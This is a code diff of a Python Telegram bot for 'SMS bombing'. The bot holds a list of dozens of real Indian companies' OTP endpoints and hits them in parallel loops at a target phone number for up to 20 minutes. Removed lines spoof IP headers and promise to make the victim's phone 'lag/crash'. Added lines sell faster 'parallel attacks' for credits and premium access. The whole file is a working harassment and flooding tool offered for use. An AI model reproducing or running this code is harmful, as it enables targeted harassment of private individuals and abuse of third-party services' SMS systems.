+    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"},
+    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Vyapar", "url": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}", "method": "GET", "headers": {}, "data": None},
+    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'},
+    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
+    {"name": "MyGov", "url": lambda p: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male", "method": "GET", "headers": {}, "data": None},
+    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'},
+    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'},
+    {"name": "CodFirm", "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
+    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","resend":true}}'},
+    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
+    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
+    {"name": "AstroSage", "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}", "method": "GET", "headers": {}, "data": None},
+    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "TooToo", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'},
+    {"name": "ConfirmTkt", "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}", "method": "GET", "headers": {}, "data": None},
+    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'},
+    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'},
+    {"name": "Nuvama", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'},
+    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+]
+
+# ==================== FILE OPERATIONS ====================
 def init_files():
-    for file in FILES.values():
-        if not os.path.exists(file):
-            default_data = {}
-            if file == "admins.json":
-                default_data = [OWNER_ID]
-            elif file == "blocked.json":
-                default_data = []
-            elif file == "settings.json":
-                default_data = {
-                    "bot_active": True,
-                    "channels": {"main": DEFAULT_CHANNEL},
-                    "channel_links": {"main": CHANNEL_LINK}
-                }
-            with open(file, 'w') as f:
-                json.dump(default_data, f, indent=2)
-
-def load_json(file):
-    try:
-        with open(file, 'r') as f:
-            return json.load(f)
-    except:
-        return {} if file not in ["admins.json", "blocked.json"] else []
-
-def save_json(file, data):
-    with open(file, 'w') as f:
-        json.dump(data, f, indent=2, default=str)
+    if not os.path.exists(USERS_FILE):
+        with open(USERS_FILE, "w") as f:
+            json.dump({}, f)
+    if not os.path.exists(SETTINGS_FILE):
+        with open(SETTINGS_FILE, "w") as f:
+            json.dump({
+                "bot_active": True, 
+                "channels": CHANNELS, 
+                "channel_links": CHANNEL_LINKS, 
+                "owner_username": OWNER_USERNAME, 
+                "credit_prices": CREDIT_PRICES, 
+                "premium_price": PREMIUM_PRICE,
+                "main_bot_token": DEFAULT_MAIN_BOT_TOKEN,
+                "admin_bot_token": DEFAULT_ADMIN_BOT_TOKEN
+            }, f)
+    if not os.path.exists(ADMINS_FILE):
+        with open(ADMINS_FILE, "w") as f:
+            json.dump([OWNER_ID], f)
+    if not os.path.exists(APIS_FILE):
+        with open(APIS_FILE, "w") as f:
+            api_data = [{"id": i, "name": api["name"], "url": str(api["url"]), "method": api["method"], "headers": api["headers"], "data": str(api["data"]), "active": True} for i, api in enumerate(ULTIMATE_APIS)]
+            json.dump(api_data, f, indent=2)
+    if not os.path.exists(BLOCKED_FILE):
+        with open(BLOCKED_FILE, "w") as f:
+            json.dump([], f)
+    if not os.path.exists(GIFTCODES_FILE):
+        with open(GIFTCODES_FILE, "w") as f:
+            json.dump({}, f)
 
 init_files()
 
-users = load_json(FILES["users"])
-settings = load_json(FILES["settings"])
-admins = load_json(FILES["admins"])
-blocked = load_json(FILES["blocked"])
-giftcodes = load_json(FILES["giftcodes"])
-sessions = load_json(FILES["sessions"])
+def load_json(file):
+    try:
+        with open(file, "r") as f:
+            return json.load(f)
+    except:
+        return {} if file != BLOCKED_FILE and file != ADMINS_FILE else []
 
+def save_json(file, data):
+    with open(file, "w") as f:
+        json.dump(data, f, indent=2)
+
+users = load_json(USERS_FILE)
+settings = load_json(SETTINGS_FILE)
+admins = load_json(ADMINS_FILE)
+apis_db = load_json(APIS_FILE)
+blocked = load_json(BLOCKED_FILE)
+giftcodes = load_json(GIFTCODES_FILE)
+
+# Load tokens
+MAIN_BOT_TOKEN = settings.get("main_bot_token", DEFAULT_MAIN_BOT_TOKEN)
+ADMIN_BOT_TOKEN = settings.get("admin_bot_token", DEFAULT_ADMIN_BOT_TOKEN)
+
+# Initialize bots
 bot = telebot.TeleBot(MAIN_BOT_TOKEN, parse_mode="HTML")
 admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN, parse_mode="HTML")
 
-active_tasks = {}
+logger.info(f"✅ Main bot loaded: @{bot.get_me().username}")
+logger.info(f"✅ Admin bot loaded: @{admin_bot.get_me().username}")
 
-logger.info(f"✅ Main bot: @{bot.get_me().username}")
-logger.info(f"✅ Admin bot: @{admin_bot.get_me().username}")
+# ==================== GIFT CODE SYSTEM ====================
+def generate_gift_code(length=8):
+    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
-# ============================================================================
-# HELPER FUNCTIONS
-# ============================================================================
+def create_gift_code(credits, uses=1, expires_days=None):
+    code = generate_gift_code()
+    while code in giftcodes:
+        code = generate_gift_code()
+    
+    expiry = None
+    if expires_days:
+        expiry = (datetime.now() + timedelta(days=expires_days)).isoformat()
+    
+    giftcodes[code] = {
+        "credits": credits,
+        "max_uses": uses,
+        "used_by": [],
+        "created": datetime.now().isoformat(),
+        "expires": expiry
+    }
+    save_json(GIFTCODES_FILE, giftcodes)
+    return code
 
+def redeem_gift_code(user_id, code):
+    code = code.upper()
+    if code not in giftcodes:
+        return {"success": False, "message": "❌ Invalid gift code!"}
+    
+    gift = giftcodes[code]
+    uid = str(user_id)
+    
+    # Check expiry
+    if gift["expires"] and datetime.now() > datetime.fromisoformat(gift["expires"]):
+        return {"success": False, "message": "❌ Gift code expired!"}
+    
+    # Check usage limit
+    if len(gift["used_by"]) >= gift["max_uses"]:
+        return {"success": False, "message": "❌ Gift code fully used!"}
+    
+    # Check if user already used
+    if uid in gift["used_by"]:
+        return {"success": False, "message": "❌ You already used this code!"}
+    
+    # Add credits
+    if uid not in users:
+        users[uid] = {"credits": 0, "joined": str(datetime.now())}
+    
+    users[uid]["credits"] = users[uid].get("credits", 0) + gift["credits"]
+    gift["used_by"].append(uid)
+    
+    save_json(USERS_FILE, users)
+    save_json(GIFTCODES_FILE, giftcodes)
+    
+    return {"success": True, "message": f"🎁 Success! +{gift['credits']} credits added!"}
+
+# ==================== HELPER FUNCTIONS ====================
 def is_admin(uid):
     return uid in admins or uid == OWNER_ID
 
 def is_blocked(uid):
     return uid in blocked
 
+def is_premium(uid):
+    uid = str(uid)
+    if uid not in users:
+        return False
+    if "premium_until" not in users[uid]:
+        return False
+    expiry = datetime.fromisoformat(users[uid]["premium_until"])
+    return datetime.now() < expiry
+
+# ⚡ NEW: Check unlocked speeds for user
+def get_unlocked_speeds(uid):
+    uid = str(uid)
+    if uid not in users:
+        return ["1x", "2x", "3x"]
+    
+    # Premium users get all speeds
+    if is_premium(int(uid)):
+        return list(SPEED_CREDITS.keys())
+    
+    # Non-premium: default + admin unlocked
+    unlocked = users[uid].get("unlocked_speeds", ["1x", "2x", "3x"])
+    return unlocked
+
 def check_channel(uid):
-    try:
-        channels = settings.get("channels", {"main": DEFAULT_CHANNEL})
-        for ch in channels.values():
-            try:
-                member = bot.get_chat_member(ch, uid)
-                if member.status not in ["member", "administrator", "creator"]:
-                    return False
-            except:
+    channels = settings.get("channels", CHANNELS)
+    for ch in channels.values():
+        try:
+            status = bot.get_chat_member(ch, uid).status
+            if status in ["left", "kicked"]:
                 return False
-        return True
-    except:
-        return True
+        except:
+            return False
+    return True
 
-def generate_gift_code(length=8):
-    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
+def show_join(chat_id):
+    channels = settings.get("channels", CHANNELS)
+    links = settings.get("channel_links", CHANNEL_LINKS)
+    
+    kb = types.InlineKeyboardMarkup()
+    for name, ch in channels.items():
+        kb.add(types.InlineKeyboardButton(f"Join {name.title()}", url=links[name]))
+    kb.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
+    
+    bot.send_message(chat_id, "⚠️ <b>Join all channels first!</b>", reply_markup=kb)
 
-def show_join_channel(chat_id):
-    mk = types.InlineKeyboardMarkup()
-    links = settings.get("channel_links", {"main": CHANNEL_LINK})
-    for name, link in links.items():
-        mk.add(types.InlineKeyboardButton(f"Join {name.title()}", url=link))
-    mk.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
-    bot.send_message(chat_id, "🚫 <b>Join channel first!</b>", reply_markup=mk)
+def main_kb():
+    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    kb.row("🚀 Start", "💰 My Credits")
+    kb.row("📊 Stats", "🔗 Refer")
+    kb.row("💳 Buy Credits & Premium", "❓ Help")
+    kb.row("🎁 Redeem Code", "📞 Owner")
+    return kb
 
-# ============================================================================
-# SMS CRASH ENGINE - NO DELAYS!
-# ============================================================================
-
-async def hit_crash_api(session, api, phone, stats):
-    """Hit API with NO error handling - pure speed"""
+# ==================== BOMBING FUNCTIONS WITH SPEED MULTIPLIER ====================
+async def hit_api(session, api, phone, stats):
     try:
-        url = api["url"]
-        headers = api["headers"].copy()
-        headers["User-Agent"] = "Mozilla/5.0"
-        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+        url = api["url"](phone) if callable(api["url"]) else api["url"]
+        headers = api["headers"]
+        method = api["method"]
+        data_func = api["data"]
+        data = data_func(phone) if data_func else None
         
-        data_str = api["data"](phone)
-        
-        async with session.post(url, headers=headers, data=data_str, timeout=1, ssl=False) as resp:
-            if resp.status in [200, 201, 202]:
-                stats["ok"] += 1
-            else:
-                stats["fail"] += 1
-        stats["tot"] += 1
+        if method == "POST":
+            async with session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                stats["total"] += 1
+                if resp.status in [200, 201]:
+                    stats["success"] += 1
+                else:
+                    stats["fail"] += 1
+        else:  # GET
+            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                stats["total"] += 1
+                if resp.status in [200, 201]:
+                    stats["success"] += 1
+                else:
+                    stats["fail"] += 1
     except:
         stats["fail"] += 1
-        stats["tot"] += 1
+        stats["total"] += 1
 
-async def execute_crash_bombing(sid, uid, phone, duration):
-    """ULTRA FAST SMS CRASH BOMBING - NO MERCY!"""
-    stats = {"sid": sid, "ok": 0, "fail": 0, "tot": 0, "running": True}
-    active_tasks[sid] = stats
+# ⚡ UPGRADED BOMBING TASK WITH SPEED MULTIPLIER
+async def bombing_task(phone, chat_id, msg_id, speed_multiplier):
+    active_tasks[chat_id] = {"running": True}
+    stats = {"success": 0, "fail": 0, "total": 0}
     
-    logger.info(f"💥 CRASH BOMBING STARTED on {phone} for {duration} minutes")
+    active_apis = [api for api in ULTIMATE_APIS]
     
-    # UNLIMITED CONNECTIONS - MAXIMUM POWER
-    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False, force_close=False)
-    
-    async with aiohttp.ClientSession(connector=connector) as session:
+    async with aiohttp.ClientSession() as session:
         start_time = time.time()
-        end_time = start_time + (duration * 60)
+        duration = 20 * 60  # 20 minutes
         
-        wave_count = 0
-        
-        while time.time() < end_time and stats["running"]:
-            wave_count += 1
+        while active_tasks[chat_id]["running"] and (time.time() - start_time) < duration:
+            elapsed = int(time.time() - start_time)
+            remaining = duration - elapsed
             
-            # Hit ALL APIs in PARALLEL - NO WAITING
-            tasks = [hit_crash_api(session, api, phone, stats) for api in CRASH_APIS]
-            await asyncio.gather(*tasks, return_exceptions=True)
+            mins = remaining // 60
+            secs = remaining % 60
             
-            # NO DELAY = MAXIMUM SPEED
-            # This will send 120+ APIs INSTANTLY
+            progress = (elapsed / duration) * 100
+            bar = "█" * int(progress / 5) + "░" * (20 - int(progress / 5))
             
-            # Only log every 100 waves
-            if wave_count % 100 == 0:
-                logger.info(f"💥 Wave {wave_count}: ✅{stats['ok']} Total:{stats['tot']}")
-        
-        if sid in sessions:
-            sessions[sid]["ok"] = stats["ok"]
-            sessions[sid]["fail"] = stats["fail"]
-            sessions[sid]["tot"] = stats["tot"]
-            sessions[sid]["active"] = False
-            save_json(FILES["sessions"], sessions)
-    
-    if sid in active_tasks:
-        del active_tasks[sid]
-    
-    logger.info(f"✅ CRASH bombing done: {stats['ok']} success, Total waves: {wave_count}")
+            status_msg = f"""
+🔥 <b>API BOMBING IN PROGRESS</b>
 
-def start_crash_bombing(sid, uid, phone, duration):
-    """Start crash bombing"""
-    loop = asyncio.new_event_loop()
-    
-    def run():
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(execute_crash_bombing(sid, uid, phone, duration))
-    
-    thread = threading.Thread(target=run, daemon=True)
-    thread.start()
+📱 Number: <code>{phone}</code>
+⚡ Speed: <b>{speed_multiplier}</b> (x{speed_multiplier[:-1]} faster!)
 
-def stop_bombing(sid):
-    if sid in active_tasks:
-        active_tasks[sid]["running"] = False
-    if sid in sessions:
-        sessions[sid]["active"] = False
-        save_json(FILES["sessions"], sessions)
-
-def update_progress(sid, chat_id, message_id, duration):
-    start = time.time()
-    duration_sec = duration * 60
-    
-    while True:
-        time.sleep(2)
-        
-        s = sessions.get(sid)
-        if not s or not s.get("active"):
-            break
-        
-        stats = active_tasks.get(sid, {})
-        elapsed = time.time() - start
-        left = duration_sec - elapsed
-        
-        if left <= 0:
-            break
-        
-        mins = int(left // 60)
-        secs = int(left % 60)
-        progress = (elapsed / duration_sec) * 100
-        bar = "█" * int(progress / 5) + "░" * (20 - int(progress / 5))
-        
-        try:
-            bot.edit_message_text(
-                f"""
-💥 <b>CRASH BOMBING LIVE!</b>
-
-📱 <b>Target:</b> <code>{s['phone']}</code>
-⏱️ <b>Left:</b> {mins}m {secs}s
-
+⏱️ Time Left: <b>{mins}m {secs}s</b>
 {bar} {progress:.1f}%
 
-<b>━━━━━━━ STATS ━━━━━━━</b>
+📊 <b>Statistics:</b>
+✅ Success: <b>{stats['success']}</b>
+❌ Failed: <b>{stats['fail']}</b>
+🎯 Total Hits: <b>{stats['total']}</b>
+🚀 Active Threads: <b>{speed_multiplier[:-1]}</b>
 
-✅ Success: {stats.get('ok', 0)}
-❌ Failed: {stats.get('fail', 0)}
-🎯 Total: {stats.get('tot', 0)}
-
-💥 <b>PHONE LAGGING/CRASHING!</b>
-📲 <b>SMS flooding at MAX SPEED!</b>
-""",
-                chat_id,
-                message_id,
-                reply_markup=types.InlineKeyboardMarkup().add(
-                    types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{sid}")
-                )
-            )
-        except:
-            pass
+💡 Bot hitting {speed_multiplier[:-1]} APIs simultaneously...
+"""
+            
+            try:
+                bot.edit_message_text(status_msg, chat_id, msg_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{chat_id}")))
+            except:
+                pass
+            
+            # ⚡ SPEED MULTIPLIER: Hit multiple APIs at once
+            multiplier_value = int(speed_multiplier[:-1])  # "5x" -> 5
+            
+            # Create tasks for parallel execution
+            tasks = []
+            for _ in range(multiplier_value):
+                for api in active_apis:
+                    tasks.append(hit_api(session, api, phone, stats))
+            
+            # Execute all tasks concurrently
+            await asyncio.gather(*tasks, return_exceptions=True)
+            
+            await asyncio.sleep(5)  # Wait before next batch
     
-    # Final
-    s = sessions.get(sid)
-    if s:
-        try:
-            bot.edit_message_text(
-                f"""
-✅ <b>CRASH BOMBING DONE!</b>
+    # Final report
+    final_msg = f"""
+✅ <b>BOMBING COMPLETED!</b>
 
-📱 <b>Target:</b> <code>{s['phone']}</code>
-⏱️ <b>Duration:</b> {duration} min
+📱 Number: <code>{phone}</code>
+⚡ Speed: <b>{speed_multiplier}</b>
+⏱️ Duration: 20 minutes
 
-<b>━━━━━ FINAL STATS ━━━━━</b>
+📊 <b>Final Statistics:</b>
+✅ Successful: <b>{stats['success']}</b>
+❌ Failed: <b>{stats['fail']}</b>
+🎯 Total Requests: <b>{stats['total']}</b>
 
-✅ Success: {s['ok']}
-❌ Failed: {s['fail']}
-🎯 Total: {s['tot']}
+💰 Credits used: {SPEED_CREDITS[speed_multiplier]}
+"""
+    try:
+        bot.edit_message_text(final_msg, chat_id, msg_id)
+    except:
+        pass
+    
+    if chat_id in active_tasks:
+        del active_tasks[chat_id]
 
-💥 <b>PHONE CRASHED/LAGGED!</b>
-💰 <b>Credit used:</b> 1
-""",
-                chat_id,
-                message_id
-            )
-        except:
-            pass
 
-# ============================================================================
-# MAIN BOT
-# ============================================================================
-
+# ==================== MAIN BOT HANDLERS ====================
 @bot.message_handler(commands=["start"])
-def cmd_start(m):
+def start_cmd(m):
     if is_blocked(m.from_user.id):
-        return bot.reply_to(m, "🚫 Blocked!")
-    
+        bot.reply_to(m, "🚫 <b>You are blocked!</b>")
+        return
+    if not settings.get("bot_active", True):
+        bot.reply_to(m, "⚠️ <b>Bot is under maintenance!</b>")
+        return
     if not check_channel(m.from_user.id):
-        show_join_channel(m.chat.id)
+        show_join(m.chat.id)
         return
     
     uid = str(m.from_user.id)
     if uid not in users:
-        users[uid] = {
-            "username": m.from_user.username or "user",
-            "name": m.from_user.first_name,
-            "cr": 50,
-            "joined": datetime.now().isoformat(),
-            "total": 0
-        }
-        save_json(FILES["users"], users)
+        users[uid] = {"credits": START_CREDITS, "joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
+        
+        # Check referral
+        args = m.text.split()
+        if len(args) == 2 and args[1].startswith("ref_"):
+            ref_id = args[1].replace("ref_", "")
+            if ref_id in users and ref_id != uid:
+                users[ref_id]["credits"] = users[ref_id].get("credits", 0) + REF_CREDITS
+                try:
+                    bot.send_message(int(ref_id), f"🎉 <b>+{REF_CREDITS} credits!</b>\n\nNew referral joined!")
+                except:
+                    pass
+        save_json(USERS_FILE, users)
     
-    u = users[uid]
+    credits = users[uid].get("credits", 0)
+    premium_status = "✅ Active" if is_premium(m.from_user.id) else "❌ Not Active"
     
-    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    kb.row("💥 Start Crash Bombing")
-    kb.row("💰 Credits", "📊 Stats")
-    kb.row("🎁 Gift Code", "❓ Help")
-    
-    bot.send_message(
-        m.chat.id,
-        f"""
-╔═════════════════════════╗
-║ 💥 <b>CRASH BOMBER BOT</b> 💥  ║
-╚═════════════════════════╝
+    bot.send_message(m.chat.id, f"""
+👋 <b>Welcome to Ultimate Speed Bomber!</b>
 
-👤 <b>User:</b> {u['name']}
-💰 <b>Credits:</b> {u['cr']}
+💰 Credits: <b>{credits}</b>
+👑 Premium: {premium_status}
 
-<b>━━━━━━━ POWER ━━━━━━━</b>
+⚡ <b>SPEED MULTIPLIER SYSTEM:</b>
+• 1x Speed = 1 credit (Normal)
+• 2x Speed = 2 credits (2x faster!)
+• 3x Speed = 3 credits (3x faster!)
+• 4x-10x = Premium/Unlock only 🔒
 
-📲 <b>APIs:</b> {len(CRASH_APIS)}
-⚡ <b>Type:</b> SMS Flood
-💥 <b>Effect:</b> LAG/CRASH
-💰 <b>Cost:</b> 1 credit
+📱 <b>How to use:</b>
+Send a 10-digit phone number to start!
 
-<b>⚡ ULTRA FAST - NO DELAYS!</b>
-<b>💥 PHONE WILL LAG/CRASH!</b>
-⚠️ Your phone 100% SAFE!
-
-📞 {OWNER_USERNAME} for credits
-""",
-        reply_markup=kb
-    )
+💡 Higher speed = More parallel attacks!
+""", reply_markup=main_kb())
 
 @bot.callback_query_handler(func=lambda c: c.data == "verify")
-def cb_verify(c):
+def verify_cb(c):
     if check_channel(c.from_user.id):
         bot.answer_callback_query(c.id, "✅ Verified!")
-        try:
-            bot.delete_message(c.message.chat.id, c.message.message_id)
-        except:
-            pass
-        class FakeMsg:
-            def __init__(self):
-                self.from_user = c.from_user
-                self.chat = c.message.chat
-        cmd_start(FakeMsg())
+        bot.delete_message(c.message.chat.id, c.message.message_id)
+        start_cmd(c.message)
     else:
-        bot.answer_callback_query(c.id, "❌ Join first!", show_alert=True)
-
-@bot.message_handler(func=lambda m: m.text == "💥 Start Crash Bombing")
-def btn_bombing(m):
-    if not check_channel(m.from_user.id):
-        return
-    
-    mk = types.InlineKeyboardMarkup()
-    mk.add(types.InlineKeyboardButton("⏱️ 5 Min", callback_data="dur_5"))
-    mk.add(types.InlineKeyboardButton("⏱️ 10 Min", callback_data="dur_10"))
-    mk.add(types.InlineKeyboardButton("⏱️ 20 Min", callback_data="dur_20"))
-    
-    bot.send_message(
-        m.chat.id,
-        f"🎯 <b>Select Duration:</b>\n\n"
-        f"📲 <b>APIs:</b> {len(CRASH_APIS)}\n"
-        f"💰 <b>Cost:</b> 1 credit\n"
-        f"💥 <b>Effect:</b> PHONE LAG/CRASH!\n\n"
-        f"Choose duration:",
-        reply_markup=mk
-    )
-
-@bot.callback_query_handler(func=lambda c: c.data.startswith("dur_"))
-def cb_duration(c):
-    try:
-        duration = int(c.data.split("_")[1])
-    except:
-        return bot.answer_callback_query(c.id, "❌ Invalid!")
-    
-    uid = str(c.from_user.id)
-    global users
-    users = load_json(FILES["users"])
-    u = users.get(uid, {})
-    
-    if u.get("cr", 0) < 1:
-        bot.answer_callback_query(c.id, f"❌ No credits! Balance: {u.get('cr', 0)}", show_alert=True)
-        return
-    
-    users[uid]["temp_duration"] = duration
-    save_json(FILES["users"], users)
-    
-    bot.edit_message_text(
-        f"⏱️ <b>Selected:</b> {duration} min\n"
-        f"📲 <b>SMS flood:</b> ~{len(CRASH_APIS) * duration * 10}\n\n"
-        f"📱 <b>Send target number:</b>\n"
-        f"Format: 9876543210",
-        c.message.chat.id,
-        c.message.message_id
-    )
-    bot.answer_callback_query(c.id, f"✅ {duration} min!")
-
-@bot.message_handler(func=lambda m: m.text and m.text.isdigit() and len(m.text) == 10)
-def handle_phone(m):
-    if not check_channel(m.from_user.id):
-        return
-    
-    phone = m.text.strip()
-    
-    if phone.startswith(('100', '101', '102', '108', '112')):
-        return bot.reply_to(m, "❌ Emergency blocked!")
-    
-    uid = str(m.from_user.id)
-    global users
-    users = load_json(FILES["users"])
-    u = users.get(uid, {})
-    
-    if u.get("cr", 0) < 1:
-        return bot.reply_to(m, f"❌ No credits!\n💰 Balance: {u.get('cr', 0)}")
-    
-    duration = u.get("temp_duration", 10)
-    
-    u["cr"] -= 1
-    u["total"] = u.get("total", 0) + 1
-    if "temp_duration" in u:
-        del u["temp_duration"]
-    users[uid] = u
-    save_json(FILES["users"], users)
-    
-    sid = hashlib.md5(f"{m.from_user.id}{time.time()}".encode()).hexdigest()[:12]
-    sessions[sid] = {
-        "uid": m.from_user.id,
-        "phone": phone,
-        "duration": duration,
-        "start": datetime.now().isoformat(),
-        "active": True,
-        "ok": 0,
-        "fail": 0,
-        "tot": 0
-    }
-    save_json(FILES["sessions"], sessions)
-    
-    start_crash_bombing(sid, m.from_user.id, phone, duration)
-    
-    progress_msg = bot.send_message(
-        m.chat.id,
-        f"""
-💥 <b>CRASH BOMBING STARTED!</b>
-
-📱 <b>Target:</b> <code>{phone}</code>
-⏱️ <b>Duration:</b> {duration} min
-📲 <b>APIs:</b> {len(CRASH_APIS)}
-
-<b>━━━━━━━━━━━━━</b>
-
-✅ Success: 0
-🎯 Total: 0
-
-💥 <b>ULTRA FAST MODE!</b>
-💥 <b>PHONE WILL LAG/CRASH!</b>
-""",
-        reply_markup=types.InlineKeyboardMarkup().add(
-            types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{sid}")
-        )
-    )
-    
-    threading.Thread(target=lambda: update_progress(sid, m.chat.id, progress_msg.message_id, duration), daemon=True).start()
+        bot.answer_callback_query(c.id, "❌ Join all channels first!", show_alert=True)
 
 @bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
-def cb_stop(c):
-    stop_bombing(c.data.replace("stop_", ""))
-    bot.answer_callback_query(c.id, "🛑 Stopping...")
+def stop_cb(c):
+    chat_id = int(c.data.replace("stop_", ""))
+    if chat_id in active_tasks:
+        active_tasks[chat_id]["running"] = False
+        bot.answer_callback_query(c.id, "🛑 Stopping...")
+    else:
+        bot.answer_callback_query(c.id, "No active task!")
 
-@bot.message_handler(func=lambda m: m.text == "💰 Credits")
-def btn_credits(m):
-    global users
-    users = load_json(FILES["users"])
-    u = users.get(str(m.from_user.id), {})
-    bot.reply_to(m, f"💰 <b>Credits:</b> {u.get('cr', 0)}\n\n📞 {OWNER_USERNAME}")
+# ⚡ SPEED SELECTION CALLBACK
+@bot.callback_query_handler(func=lambda c: c.data.startswith("speed_"))
+def speed_select_cb(c):
+    try:
+        data_parts = c.data.split("_")
+        speed = data_parts[1] + "x"  # "1", "2", "3" -> "1x", "2x", "3x"
+        phone = data_parts[2]
+        
+        uid = str(c.from_user.id)
+        unlocked = get_unlocked_speeds(c.from_user.id)
+        
+        # Check if speed is unlocked
+        if speed not in unlocked:
+            bot.answer_callback_query(c.id, f"🔒 {speed} is locked! Get Premium or contact admin to unlock.", show_alert=True)
+            return
+        
+        credits = users[uid].get("credits", 0)
+        cost = SPEED_CREDITS[speed]
+        
+        # Check credits
+        if credits < cost:
+            bot.answer_callback_query(c.id, f"❌ Need {cost} credits for {speed}!", show_alert=True)
+            return
+        
+        # Deduct credits
+        users[uid]["credits"] = credits - cost
+        save_json(USERS_FILE, users)
+        
+        bot.answer_callback_query(c.id, f"🚀 Starting {speed} bombing!")
+        
+        wait_msg = bot.edit_message_text(f"🚀 <b>Starting {speed} bombing...</b>\n\n📱 Target: {phone}", c.message.chat.id, c.message.message_id)
+        
+        # Start bombing
+        loop = asyncio.new_event_loop()
+        threading.Thread(target=lambda: loop.run_until_complete(bombing_task(phone, c.message.chat.id, wait_msg.message_id, speed)), daemon=True).start()
+        
+    except Exception as e:
+        bot.answer_callback_query(c.id, f"❌ Error: {e}")
+
+@bot.message_handler(commands=["redeem"])
+def redeem_cmd(m):
+    if is_blocked(m.from_user.id):
+        return
